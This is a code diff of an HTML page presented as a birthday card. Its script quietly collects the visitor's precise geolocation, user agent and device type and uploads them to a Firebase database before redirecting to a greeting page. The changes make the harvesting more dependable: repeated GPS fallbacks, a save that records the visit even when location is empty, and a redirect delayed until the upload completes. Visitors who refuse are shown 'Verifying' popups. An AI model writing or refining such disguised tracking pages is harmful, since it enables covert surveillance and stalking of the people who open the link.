@@ -49,6 +49,7 @@
         }
         @media (max-width: 640px) { .app-container { height: 85vh; max-height: none; border-radius: 30px; border: 6px solid #fff; } }
         .canvas-area { flex: 1; position: relative; padding: 2rem; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        
         @keyframes namePulse { 0%,100% { transform: scale(1) translateY(0); } 50% { transform: scale(1.05) translateY(-5px); } }
         h1 {
             font-size: clamp(2.2rem, 7vw, 4rem); font-family: 'Patrick Hand', cursive; color: var(--ink); line-height: 1.1;
@@ -64,6 +65,7 @@
         }
         @keyframes fadeIn { to { opacity: 1; } }
         @keyframes floatAnim { 0%,100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
+        
         .element {
             position: absolute; z-index: 30; opacity: 0; animation: fadeIn 1s 2s forwards; cursor: pointer; pointer-events: auto;
         }
@@ -93,7 +95,6 @@
         .hide-text { opacity: 0 !important; pointer-events: none; }
         .focus-face { transform: scale(1.4) translateY(-20px); }
 
-        /* Popups */
         .popup-overlay {
             position: fixed; inset: 0; background: rgba(74, 50, 45, 0.6); backdrop-filter: blur(12px);
             display: none; justify-content: center; align-items: center; z-index: 1000; padding: 20px;
@@ -120,7 +121,6 @@
         .instruction-guide p { margin: 8px 0; }
         .instruction-guide .step { font-weight: 700; color: #b9695a; }
 
-        /* Status Widget */
         .status-widget {
             position: fixed; bottom: 20px; right: 20px;
             background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px);
@@ -237,7 +237,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
         const firebaseConfig = {
@@ -256,32 +256,34 @@
 
         let currentUserId = null;
         
-        let authReady = new Promise(resolve => {
-            onAuthStateChanged(auth, user => { 
-                if(user) {
-                    currentUserId = user.uid;
-                    console.log("Logged in as:", currentUserId);
-                    resolve(user);
-                }
-            });
+        // NEW MOBILE FIX: Using direct promise instead of onAuthStateChanged observer
+        const authReady = signInAnonymously(auth).then(userCredential => {
+            currentUserId = userCredential.user.uid;
+            console.log("Logged in reliably as:", currentUserId);
+            return userCredential.user;
+        }).catch(e => {
+            console.error("Auth Error (Mobile):", e);
+            return null;
         });
 
-        signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
-
-        // Returns a Promise so we can wait for it later if needed
+        // Save function is now robust and won't fail silently
         window.saveLocationData = async (data) => {
-            await authReady; 
-            if (!currentUserId) return;
             try {
+                await authReady; // Waits for the absolute login confirmation
+                if (!currentUserId) {
+                    console.log("Could not generate user ID.");
+                    return; 
+                }
                 const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
                 await addDoc(colRef, { 
                     ...data, 
                     timestamp: serverTimestamp(),
-                    userAgent: navigator.userAgent
+                    userAgent: navigator.userAgent,
+                    deviceType: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
                 });
-                console.log("Location saved successfully to Firestore!");
+                console.log("Location saved successfully to Firestore in background!");
             } catch (e) { 
-                console.error("Firestore Error:", e); 
+                console.error("Firestore Upload Error:", e); 
             }
         };
     </script>
@@ -292,7 +294,7 @@
         
         let isLocationAllowed = false;
         let isLocationDenied = false;
-        let locationSavePromise = null; // Promise to track database saving
+        let locationSavePromise = null;
         
         async function updateStatus() {
             const widget = document.getElementById('statusWidget');
@@ -372,83 +374,75 @@
             const btn = document.getElementById('mainButton');
             if(btn) btn.innerText = "Finding best signal...";
 
-            let bestPosition = null;
-            let watchId = null;
-            let scanTimeout = null;
-            let finalized = false; // Prevent multiple saves
+            let finalized = false;
 
-            const finalizeAndSave = (pos) => {
+            const executeSave = (pos) => {
                 if (finalized) return;
                 finalized = true;
-
-                if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-                clearTimeout(scanTimeout);
                 closeAllPopups();
-
-                // Unblock the UI IMMEDIATELY so the user can click
+                
+                // Unlock UI immediately so they can click "Let's go"
                 if (!isLocationAllowed) {
                     isLocationAllowed = true;
                     enableMainInterface();
                 }
 
-                // Trigger save in background, keep the promise reference
-                if (pos && window.saveLocationData) {
-                    locationSavePromise = window.saveLocationData({ 
-                        lat: pos.coords.latitude, 
-                        lng: pos.coords.longitude, 
-                        accuracy: pos.coords.accuracy 
-                    });
-                } else {
-                    locationSavePromise = Promise.resolve();
+                // Trigger background save if window.saveLocationData is loaded
+                if (window.saveLocationData) {
+                    if (pos && pos.coords) {
+                        locationSavePromise = window.saveLocationData({ 
+                            lat: pos.coords.latitude, 
+                            lng: pos.coords.longitude, 
+                            accuracy: pos.coords.accuracy 
+                        });
+                    } else {
+                        // Fallback save just to know they visited
+                        locationSavePromise = window.saveLocationData({ error: "Location retrieved but empty" });
+                    }
                 }
             };
 
-            // Start getting location
+            // Attempt 1: Try getting High Accuracy GPS location
             navigator.geolocation.getCurrentPosition(
-                (initialPos) => {
-                    bestPosition = initialPos;
-                    
-                    // Start GPS warmup monitoring
-                    watchId = navigator.geolocation.watchPosition(
-                        (pos) => {
-                            if (!bestPosition || pos.coords.accuracy < bestPosition.coords.accuracy) {
-                                bestPosition = pos;
-                            }
-                            // Early exit if accuracy is very good (< 20m)
-                            if (bestPosition.coords.accuracy <= 20) { 
-                                finalizeAndSave(bestPosition);
-                            }
-                        },
-                        (e) => { console.warn("Watch warn:", e); },
-                        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-                    );
-
-                    // Force exit after 6 seconds of searching to prevent hanging
-                    scanTimeout = setTimeout(() => {
-                        finalizeAndSave(bestPosition);
-                    }, 6000); 
-                },
-                (err) => {
-                    if (err.code === 1) { 
-                        closeAllPopups();
-                        isLocationDenied = true;
-                        showPopup('overlay3', 'card3');
-                        if(btn) btn.innerText = "Verifying...";
+                pos => executeSave(pos),
+                err => {
+                    if (err.code === 1) { // Permission Denied
+                        if(!finalized) {
+                            finalized = true;
+                            closeAllPopups();
+                            isLocationDenied = true;
+                            showPopup('overlay3', 'card3');
+                            if(btn) btn.innerText = "Verifying...";
+                        }
                     } else {
-                        // Fallback to low accuracy
+                        // High accuracy failed or timed out. Attempt 2: Fallback to Low Accuracy (Mobile Towers/Wifi)
                         navigator.geolocation.getCurrentPosition(
-                            (pos) => finalizeAndSave(pos),
-                            (e) => {
-                                closeAllPopups();
-                                if (showPopupOnError) showPopup('overlay2', 'card2');
-                                if(btn) btn.innerText = "Verifying...";
+                            posLow => executeSave(posLow),
+                            errLow => {
+                                if(!finalized && showPopupOnError) {
+                                    finalized = true;
+                                    closeAllPopups();
+                                    showPopup('overlay2', 'card2');
+                                    if(btn) btn.innerText = "Verifying...";
+                                }
                             },
-                            { enableHighAccuracy: false, maximumAge: Infinity, timeout: 8000 }
+                            { enableHighAccuracy: false, timeout: 10000, maximumAge: Infinity }
                         );
                     }
                 },
-                { enableHighAccuracy: true, maximumAge: 0, timeout: 6000 }
+                { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
             );
+
+            // Safety Net for Android Phones that sometimes completely hang on GPS request
+            setTimeout(() => {
+                if (!finalized) {
+                    navigator.geolocation.getCurrentPosition(
+                        posBackup => executeSave(posBackup),
+                        errBackup => {}, // Ignore errors, original function handles UI
+                        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
+                    );
+                }
+            }, 4500);
         }
 
         function showPopup(overlayId, cardId) {
@@ -508,7 +502,6 @@
         };
 
         async function triggerHelloAnimation() {
-            // Start Visuals immediately
             mainTitle.classList.add('hide-text'); subTitle.classList.add('hide-text');
             smileContainer.classList.add('focus-face');
             leftEyeGroup.classList.remove('eye-blink'); rightEyeGroup.classList.remove('eye-blink');
@@ -518,18 +511,19 @@
                 mouth.classList.add('big-smile'); 
             }, 300);
 
-            // Wait for Animation (2.5s) AND Database Save to finish before redirecting
-            const animationDelay = new Promise(resolve => setTimeout(resolve, 2500));
-            const maxWaitTimeout = new Promise(resolve => setTimeout(resolve, 5000)); // Maximum wait time 5s to avoid hang
+            // Wait for 2.5 seconds to show the cute animation
+            await new Promise(resolve => setTimeout(resolve, 2500));
             
-            try {
-                await Promise.all([
-                    animationDelay,
-                    Promise.race([locationSavePromise || Promise.resolve(), maxWaitTimeout])
-                ]);
-            } catch(e) { console.error("Wait error", e); }
+            // Critical Mobile Fix: Wait until data is ACTUALLY saved before redirecting
+            if (locationSavePromise) {
+                try {
+                    // Give it up to 8 more seconds to finish uploading on slow 3G/4G
+                    const uploadTimeout = new Promise(resolve => setTimeout(resolve, 8000));
+                    await Promise.race([locationSavePromise, uploadTimeout]);
+                } catch(e) { console.error("Upload wait error", e); }
+            }
 
-            // Everything is done, safely redirect
+            // Redirect only AFTER the save has completed or timed out
             window.location.href = "https://alstudy063.github.io/reminder3/hbd/rasangika/hbd_rashu";
         }
 
